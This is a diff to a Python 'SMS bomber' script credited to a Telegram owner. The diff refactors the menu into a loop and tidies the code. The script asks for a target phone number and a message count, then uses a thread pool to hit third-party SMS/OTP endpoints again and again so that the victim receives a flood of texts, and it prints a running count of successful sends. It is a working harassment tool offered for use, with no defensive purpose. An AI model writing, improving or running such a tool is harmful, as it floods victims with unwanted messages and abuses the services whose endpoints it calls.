@@ -2,47 +2,49 @@ import os
 import requests
 from concurrent.futures import ThreadPoolExecutor as bff 
 import sys
-send=0 
-#----------------
+
+send = 0
 
 def logo():
     x = """
-          {
-        
            "TOOL":"XTREME SMS BOMBER",
            "OWNER":"@tm_xtreme"
            "VERSION":"1.0"
            "THREAD":"60" 
-      
-          }
     """
     print(x)
+
 def linex():
-    print("-"*40)
+    print("-" * 40)
+
 def main():
-    os.system('clear')
-    logo()
-    linex()
-    print("[A]> XTREME BOMBER")
-    print("[B]> JOIN CHANNEL")
-    x2 = input("[=]> SELECT : ")
-    if x2.lower() == "a":
-        x3 = input("[=]> ENTER NUMBER : ")
-        x4 = input("[=]> ENTER LIMIT : ")
+    while True:
+        os.system('clear')
+        logo()
         linex()
-        if x4.isdigit():
-            with bff(max_workers=120) as minhutanhu:
-                try:
-                    minhutanhu.submit(boom, x3, x4)
-                except Exception as e:
-                    print(e)
+        print("[A]> XTREME BOMBER")
+        print("[B]> JOIN CHANNEL")
+        x2 = input("[=]> SELECT : ")
+        
+        if x2.lower() == "a":
+            x3 = input("[=]> ENTER NUMBER : ")
+            x4 = input("[=]> ENTER LIMIT : ")
+            linex()
+            
+            if x4.isdigit():
+                with bff(max_workers=120) as minhutanhu:
+                    try:
+                        minhutanhu.submit(boom, x3, x4)
+                    except Exception as e:
+                        print(e)
+            else:
+                continue
+        elif x2.lower() == "b":
+            os.system("xdg-open https://t.me/tm_xtreme")
+            continue
         else:
-            main() 
-    elif x2.lower() == "b":
-        os.system("xdg-open https://t.me/tm_xtreme")
-        main()
-    else:
-        main()
+            continue
+
 def boom(nmbr, lmt):
     global send
     try:
@@ -59,12 +61,14 @@ def boom(nmbr, lmt):
             url2 = f"https://api.teamdccs.xyz/sms.php?number={nmbr}"
             req1 = requests.post(url1, headers=head1, json=data1)
             req2 = requests.get(url2)
+            
             if req1.status_code == 200:
                 send += 1
                 print(f"\r[API-1]> STATUS : [200]>[{send}]")
                 linex()
             else:
                 pass 
+            
             if req2.status_code == 200:
                 send += 1 
                 print(f"\r[API-2]> STATUS : [200]>[{send}]")
@@ -74,4 +78,5 @@ def boom(nmbr, lmt):
     except Exception as e:
         print(e)
 
-main()
+if __name__ == "__main__":
+    main()
